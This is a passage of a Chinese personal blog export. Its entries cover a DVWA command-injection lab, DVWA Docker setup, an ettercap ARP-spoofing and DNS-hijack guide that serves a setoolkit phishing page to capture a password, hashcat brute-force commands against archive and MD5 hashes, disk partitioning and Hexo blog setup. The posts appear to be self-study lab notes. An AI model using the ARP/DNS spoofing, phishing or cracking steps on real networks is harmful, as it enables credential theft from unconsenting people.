    <url>/2024/10/14/dvwa-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>命令执行漏洞主要是针对有网络测试的页面，如网络设备的web管理页面等等，利用其执行命令的输入窗口执行其他命令。</p>
<p>简单演示一下正常使用，输入127.0.0.1，执行：<br><img src="/images/pasted-36.png" alt="upload successful"></p>
<h3 id="在DVWA靶场点击command-injection设置等级为low"><a href="#在DVWA靶场点击command-injection设置等级为low" class="headerlink" title="在DVWA靶场点击command injection设置等级为low"></a>在DVWA靶场点击command injection设置等级为low</h3><p><img src="/images/pasted-37.png" alt="upload successful"></p>
<h3 id="使用命令连接符如-、-、-、-来执行命令"><a href="#使用命令连接符如-、-、-、-来执行命令" class="headerlink" title="使用命令连接符如&amp;、&amp;&amp;、|、||来执行命令"></a>使用命令连接符如&amp;、&amp;&amp;、|、||来执行命令</h3><p>相当于与或非，判断前面命令是否成功执行之后的自定义命令<br><img src="/images/pasted-38.png" alt="upload successful"><br><img src="/images/pasted-39.png" alt="upload successful"></p>
<h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>做了一点防护措施，相当于没有。<br>将这些连接符做了个判断转为空，详情如下：<br><img src="/images/pasted-40.png" alt="upload successful"></p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>测试发现使用命令连接符&amp;&amp;和;都不执行。<br><img src="/images/pasted-41.png" alt="upload successful"></p>
<p>但是可以使用其他没有被处理的连接符<br><img src="/images/pasted-42.png" alt="upload successful"></p>
<h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>连接符连接都不执行,已处理所有连接符<br><img src="/images/pasted-43.png" alt="upload successful"></p>
<h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><p>其实|是没处理的，加了空格，所以还是能够执行的<br><img src="/images/pasted-44.png" alt="upload successful"></p>
<p>执行结果：<br><img src="/images/pasted-45.png" alt="upload successful"></p>
<h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h2><p>是不可能等级，这个采用的是白名单的方式防护，只允许已知的命令执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects</span><br><span class="line">    $octet = explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">        // If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">        $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">            // Windows</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // *nix</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
        <category>dvwa</category>
      </categories>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>dvwa-部署（docker）</title>
    <url>/2024/10/14/dvwa-%E9%83%A8%E7%BD%B2%EF%BC%88docker%EF%BC%89/</url>
    <content><![CDATA[<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>发现配置了镜像加速也无法通过search查到镜像，但是下载没问题，通过网上查询镜像名称下载即可：</p>
<pre><code>https://hub.docker.com/
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull docker pull sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>

<h2 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>

<p>默认账号密码</p>
<pre><code>dvwa/dvwa
admin/password
</code></pre>
<h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2><p>通过网上使用方法使用其他人的密钥发现导入无法使用，可能是方式有问题，我是用的镜像提供的命令导入密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --name dvwa -p 8080:80 -e RECAPTCHA_PUBLIC_KEY=YOUR_KEY -e RECAPTCHA_PRIVATE_KEY=YOUR_KEY sagikazarmark/dvwa</span><br></pre></td></tr></table></figure>

<p>网上的使用方法<br>在DVWA-master&#x2F;config&#x2F;config.inc.php文件中找到下面代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27; &#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27; &#x27;;</span><br></pre></td></tr></table></figure>
<p>将其修改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
        <category>dvwa</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>ettercap arp欺骗+dns劫持+钓鱼网站</title>
    <url>/2024/10/15/ettercap-arp%E6%AC%BA%E9%AA%97-dns%E5%8A%AB%E6%8C%81-%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这次主要是使用ettercap在局域网中发现主机并欺骗其arp表，让其mac地址与攻击主机mac一致，使用dns污染其dns解析，将其访问的域名解析到本机的钓鱼网站中。</p>
<p>注意！<br>ettercap使用要一次完成，在多次测试中发现，重新arp欺骗会无法生效，原因不知。</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="发现局域网主机"><a href="#发现局域网主机" class="headerlink" title="发现局域网主机"></a>发现局域网主机</h3><p>在kali中打开ettercap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ettercap -G</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-46.png" alt="upload successful"></p>
<p>选择对应的接口，点击√号，再点击放大镜，再点击服务器<br><img src="/images/pasted-47.png" alt="upload successful"></p>
<p>192.168.0.1:网关<br>192.168.0.197:靶机</p>
<h3 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h3><p>点击靶机，再点击add to target1<br>点击网关，再点击add to target2<br><img src="/images/pasted-48.png" alt="upload successful"></p>
<p>点击地球图标，点击arp poisoning，点击ok<br><img src="/images/pasted-49.png" alt="upload successful"><br><img src="/images/pasted-50.png" alt="upload successful"></p>
<p>可在靶机上查看arp表，发现网关mac和本机mac一致，欺骗成功；但是访问正常，可能会短暂无法访问互联网。</p>
<h3 id="制作钓鱼网站"><a href="#制作钓鱼网站" class="headerlink" title="制作钓鱼网站"></a>制作钓鱼网站</h3><p>使用setoolkit社工软件制作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setoolkit</span><br></pre></td></tr></table></figure>
<p>来个好看的封面<br><img src="/images/pasted-51.png" alt="upload successful"></p>
<p>选择1<br><img src="/images/pasted-52.png" alt="upload successful"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）Social-Engineering Attacks：社会工程学攻击</span><br><span class="line">2）Penetration Testing(Fast-Track)：渗透测试（快速通道）</span><br><span class="line">3）Third Party Modules：第三模块</span><br><span class="line">4）Update the Social-Engineer Toolkit：更新社会工程学工具包</span><br><span class="line">5）Update SET configuration：更新SET配置</span><br><span class="line">6）Help, Credits, and About：帮助、致谢和关于</span><br><span class="line"></span><br><span class="line">99）Exit the Social-Engineer Toolkit：退出</span><br></pre></td></tr></table></figure>

<p>选择2<br><img src="/images/pasted-53.png" alt="upload successful"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）鱼叉式网络钓鱼攻击向量</span><br><span class="line">2）网站攻击向量</span><br><span class="line">3）感染性媒体生成器</span><br><span class="line">4）创建载荷和监听器</span><br><span class="line">5）批量邮件攻击</span><br><span class="line">6）基于Arduino的攻击向量</span><br><span class="line">7）无线接入点攻击向量</span><br><span class="line">8）QR码生成器攻击向量</span><br><span class="line">9）PowerShell攻击向量</span><br><span class="line">10）第三方模块</span><br><span class="line"></span><br><span class="line">99）返回主菜单。</span><br></pre></td></tr></table></figure>

<p>选择3<br><img src="/images/pasted-54.png" alt="upload successful"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）Java小程序攻击方法</span><br><span class="line">2）Metasploit浏览器漏洞利用方法</span><br><span class="line">3）凭证收集攻击方法</span><br><span class="line">4）Tabnabbing攻击方法</span><br><span class="line">5）Web劫持攻击方法</span><br><span class="line">6）多攻击网络方法</span><br><span class="line">7）HTA攻击方法</span><br><span class="line"></span><br><span class="line">99）返回主菜单</span><br></pre></td></tr></table></figure>

<p>随意，我这里选择1，比较方便<br><img src="/images/pasted-55.png" alt="upload successful"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）网络模板</span><br><span class="line">2）网站克隆器</span><br><span class="line">3）自定义导入</span><br><span class="line"></span><br><span class="line">99）返回网络攻击菜单</span><br></pre></td></tr></table></figure>

<p>然后输入要被访问的ip，选择谷歌模板，网站制作完成。<br><img src="/images/pasted-56.png" alt="upload successful"></p>
<h3 id="dns劫持"><a href="#dns劫持" class="headerlink" title="dns劫持"></a>dns劫持</h3><p>配置ettercap的dns劫持配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>
<p>末尾添加以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*	A	192.168.0.194</span><br></pre></td></tr></table></figure>
<p>意思是所有域名均解析成后面的ip<br><img src="/images/pasted-57.png" alt="upload successful"></p>
<p>点击软件三个点，然后选择plugins，再选择manage plugins<br><img src="/images/pasted-59.png" alt="upload successful"></p>
<p>双击dns_spoof即可<br><img src="/images/pasted-60.png" alt="upload successful"></p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="因为创建的是80端口的页面，靶机要输入http-域名"><a href="#因为创建的是80端口的页面，靶机要输入http-域名" class="headerlink" title="因为创建的是80端口的页面，靶机要输入http:&#x2F;&#x2F;+域名"></a>因为创建的是80端口的页面，靶机要输入http:&#x2F;&#x2F;+域名</h3><p><img src="/images/pasted-63.png" alt="upload successful"></p>
<h3 id="工具会有劫持成功的返回"><a href="#工具会有劫持成功的返回" class="headerlink" title="工具会有劫持成功的返回"></a>工具会有劫持成功的返回</h3><p><img src="/images/pasted-62.png" alt="upload successful"></p>
<h3 id="拿到密码"><a href="#拿到密码" class="headerlink" title="拿到密码"></a>拿到密码</h3><p><img src="/images/pasted-61.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>娱乐</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>ettercap</tag>
      </tags>
  </entry>
  <entry>
    <title>分区命令</title>
    <url>/2025/01/15/fdisk/</url>
    <content><![CDATA[<h2 id="fdisk"><a href="#fdisk" class="headerlink" title="fdisk"></a>fdisk</h2><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><p>fdisk 路径 参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb</span><br></pre></td></tr></table></figure>

<p>一般配合使用的有<br>df -h<br>lsblk<br>mkfs.ext4<br>…….</p>
<h3 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>

<h2 id="逻辑卷"><a href="#逻辑卷" class="headerlink" title="逻辑卷"></a>逻辑卷</h2><p>创建常用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br><span class="line"></span><br><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br><span class="line"></span><br><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>


<p>删除常用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>

<h2 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h2><h3 id="设备或资源忙"><a href="#设备或资源忙" class="headerlink" title="设备或资源忙"></a>设备或资源忙</h3><p>如果有返回：</p>
<pre><code>The partition table has been altered!

Calling ioctl() to re-read partition table.

WARNING: Re-reading the partition table failed with error 16: 设备或资源忙.
The kernel still uses the old table. The new table will be used at
the next reboot or after you run partprobe(8) or kpartx(8)
</code></pre>
<p>重新识别磁盘即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">partprobe /dev/sdb</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>github部署hexo</title>
    <url>/2024/08/02/github%E9%83%A8%E7%BD%B2hexo/</url>
    <content><![CDATA[<h2 id="本地ssh连接-GitHub"><a href="#本地ssh连接-GitHub" class="headerlink" title="本地ssh连接 GitHub"></a>本地ssh连接 GitHub</h2><h4 id="创建密钥"><a href="#创建密钥" class="headerlink" title="创建密钥"></a>创建密钥</h4><p>确保下载了git后输入命令</p>
<pre><code>git config --global user.name &quot;你的 GitHub 用户名&quot;
git config --global user.email &quot;你的 GitHub 邮箱&quot;
</code></pre>
<p>创建 SSH 密匙（可以-f指定输出目录）</p>
<pre><code>ssh-keygen -t rsa -C &quot;你的 GitHub 邮箱&quot;
</code></pre>
<p>什么都不用管，一路回车就行，创建好之后可以在.ssh看到有id_rsa.pub(.pub是公钥，id_rsa是私钥)。<br>打开 id_rsa.pub 并复制里面的内容。</p>
<h4 id="在-GitHub-中添加-SSH-密钥"><a href="#在-GitHub-中添加-SSH-密钥" class="headerlink" title="在 GitHub 中添加 SSH 密钥"></a>在 GitHub 中添加 SSH 密钥</h4><p>回到 GitHub，进入 Settings：<br><img src="/images/pasted-11.png" alt="upload successful"></p>
<p>选择左边栏的 SSH and GPG keys，点击 New SSH key：<br><img src="/images/pasted-12.png" alt="upload successful"></p>
<p>Title 随便取，然后把 id_rsa.pub 里面的内容到复制到 Key 中，点击 Add SSH key：<br><img src="/images/pasted-13.png" alt="upload successful"></p>
<p>保存完毕本地验证一下连接</p>
<pre><code>ssh -T git@github.com
</code></pre>
<p>出现 “Are you sure……”，输入 yes 回车确认，若出现下图的提示即连接成功：<br><img src="/images/pasted-14.png" alt="upload successful"></p>
<h2 id="创建-GitHub-仓库"><a href="#创建-GitHub-仓库" class="headerlink" title="创建 GitHub 仓库"></a>创建 GitHub 仓库</h2><p>GitHub 的主页 repository 中点击右上角的 New：<br><img src="/images/pasted-15.png" alt="upload successful"></p>
<p>填写基本信息:<br>Repository name 中输入用户名.github.io，一定要是这个名字！<br>勾选 Add a README file<br><img src="/images/pasted-16.png" alt="upload successful"></p>
<p>填好后点击 Create repository 创建仓库</p>
<h2 id="上传-hexo-程序到-GitHub"><a href="#上传-hexo-程序到-GitHub" class="headerlink" title="上传 hexo 程序到 GitHub"></a>上传 hexo 程序到 GitHub</h2><p>需要先安装 hexo-deployer-git：</p>
<pre><code>npm install hexo-deployer-git --save
</code></pre>
<p>修改_config.yml 文件末尾的 Deployment 部分：<br><img src="/images/pasted-17.png" alt="upload successful"></p>
<p>修改成如下（修改为你的用户名与仓库名）<br><img src="/images/pasted-18.png" alt="upload successful"></p>
<pre><code>deploy:
  type: git
  repo: git@github.com:w00123/w00123.github.io.git
  branch: gh-pages
</code></pre>
<p>修改完成保存后运行</p>
<pre><code>hexo c
hexo d
</code></pre>
<p>出现下面的提示说明已经把网站上传到 GitHub 了：<br><img src="/images/pasted-19.png" alt="upload successful"></p>
<p>然后我们需要在库设置（Repository Settings）中将默认分支设置为_config.yml 配置中的分支名称。<br><img src="/images/pasted-20.png" alt="upload successful"></p>
<p>然后在 pages 页面调整源分支：<br><img src="/images/pasted-21.png" alt="upload successful"></p>
<p>访问用户名.github.io就可以看到默认 hexo 了。</p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>github</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hashcat爆破压缩包</title>
    <url>/2025/02/26/hashcat%E7%88%86%E7%A0%B4%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
    <content><![CDATA[<h2 id="hashcat下载"><a href="#hashcat下载" class="headerlink" title="hashcat下载"></a>hashcat下载</h2><p>windows需要下载两个工具，一个<code>hashcat</code>，一个<code>John the Ripper</code>，下面是下载地址：</p>
<blockquote>
<p>hashcat<br><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p>
</blockquote>
<blockquote>
<p>John the Ripper<br><a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a></p>
</blockquote>
<h2 id="hashcat使用"><a href="#hashcat使用" class="headerlink" title="hashcat使用"></a>hashcat使用</h2><h3 id="获取hash值"><a href="#获取hash值" class="headerlink" title="获取hash值"></a>获取hash值</h3><ol>
<li><p>通过John the Ripper工具获取hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rar2john.exe &lt;文件名&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过windows命令获取md5值</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -hashfile &lt;文件&gt; MD5</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ol>
<li><p>-m<br>选择hash模式，通过hash值计算，可以通过命令自动运算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat &lt;hash值&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>-a<br>选择攻击模式</p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-a 0</td>
<td align="left">字典破解</td>
</tr>
<tr>
<td align="center">-a 1</td>
<td align="left">多字典组合破解</td>
</tr>
<tr>
<td align="center">-a 3</td>
<td align="left">掩码破解</td>
</tr>
<tr>
<td align="center">-a 6</td>
<td align="left">字典+掩码破解</td>
</tr>
<tr>
<td align="center">-a 7</td>
<td align="left">掩码+字典破解</td>
</tr>
</tbody></table>
</li>
</ol>
<h3 id="限制密码长度范围爆破"><a href="#限制密码长度范围爆破" class="headerlink" title="限制密码长度范围爆破"></a>限制密码长度范围爆破</h3><p>rar hash值爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 13000 -a 3 &lt;hash值&gt; ?a?a?a?a?a?a --increment --increment-min 4 --increment-max 6</span><br></pre></td></tr></table></figure>

<h3 id="MD5未知密码爆破"><a href="#MD5未知密码爆破" class="headerlink" title="MD5未知密码爆破"></a>MD5未知密码爆破</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hash -m 0 -a 3 &lt;MD5值&gt; -O</span><br></pre></td></tr></table></figure>

<h3 id="上次中断处开始"><a href="#上次中断处开始" class="headerlink" title="上次中断处开始"></a>上次中断处开始</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 13000 -a 3 --restore</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo-butterfly美化</title>
    <url>/2024/08/03/hexo-butterfly%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<h2 id="hexo博客一图流"><a href="#hexo博客一图流" class="headerlink" title="hexo博客一图流"></a>hexo博客一图流</h2><h3 id="实现效果展示"><a href="#实现效果展示" class="headerlink" title="实现效果展示"></a>实现效果展示</h3><p>头部背景与主体部分背景无缝连接<br><img src="/images/pasted-22.png" alt="upload successful"></p>
<h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><p>通过开启butterfly主题留下的inject模块功能</p>
<h4 id="添加css代码"><a href="#添加css代码" class="headerlink" title="添加css代码"></a>添加css代码</h4><p>先在主题的css文件夹中创建custom.css文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd themes/butterfly/source/css/</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-24.png" alt="upload successful"></p>
<p>编辑让顶部背景和页脚背景透明的css文件<br>vim custom.css</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#footer &#123;</span><br><span class="line">	background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header &#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">#page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[data-theme＝&quot;dark&quot;] #footer::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br><span class="line">[data-theme＝&quot;dark&quot;] #page-header::before&#123;</span><br><span class="line">   background: transparent !important;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="config-yml中开启inject部分功能"><a href="#config-yml中开启inject部分功能" class="headerlink" title="_config.yml中开启inject部分功能"></a>_config.yml中开启inject部分功能</h4><p>将head部分注释取消<br><img src="/images/pasted-23.png" alt="upload successful"></p>
<h4 id="更换背景"><a href="#更换背景" class="headerlink" title="更换背景"></a>更换背景</h4><p>vim搜索背景，更换background</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /hexo/themes/butterfly/_config.yml</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-25.png" alt="upload successful"></p>
<h3 id="效果实现"><a href="#效果实现" class="headerlink" title="效果实现"></a>效果实现</h3><h4 id="启动hexo查看效果"><a href="#启动hexo查看效果" class="headerlink" title="启动hexo查看效果"></a>启动hexo查看效果</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p>刷新页面<br><img src="/images/pasted-22.png" alt="upload successful"></p>
<h2 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h2><h3 id="封面"><a href="#封面" class="headerlink" title="封面"></a>封面</h3><p>修改部分为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim themes/butterfly/_config.yml</span><br><span class="line"></span><br><span class="line">cover:</span><br><span class="line">  #display the cover or not (是否顯示文章封面)</span><br><span class="line">  index_enable: false	#首页</span><br><span class="line">  aside_enable: false	#侧边</span><br><span class="line">  archives_enable: false#归档</span><br><span class="line">  #the position of cover in home page (封面顯示的位置)</span><br><span class="line">  #left/right/both</span><br><span class="line">  position: both</span><br><span class="line">  #When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span><br><span class="line">  default_cover: </span><br><span class="line">    # - https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg</span><br></pre></td></tr></table></figure>

<h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>分页，也就是文章内中显示的下一页上一页按钮，可通过配置文章封面显示图片，也可以通过设置主题色改变其颜色。</p>
<h2 id="置顶文章滚动页"><a href="#置顶文章滚动页" class="headerlink" title="置顶文章滚动页"></a>置顶文章滚动页</h2><h3 id="NPM-插件安装"><a href="#NPM-插件安装" class="headerlink" title="NPM 插件安装"></a>NPM 插件安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-swiper-bar --save</span><br></pre></td></tr></table></figure>

<h3 id="新增网站根目录-config-配置项-不是主题的"><a href="#新增网站根目录-config-配置项-不是主题的" class="headerlink" title="新增网站根目录_config 配置项 (不是主题的)"></a>新增网站根目录_config 配置项 (不是主题的)</h3><p>添加以下代码</p>
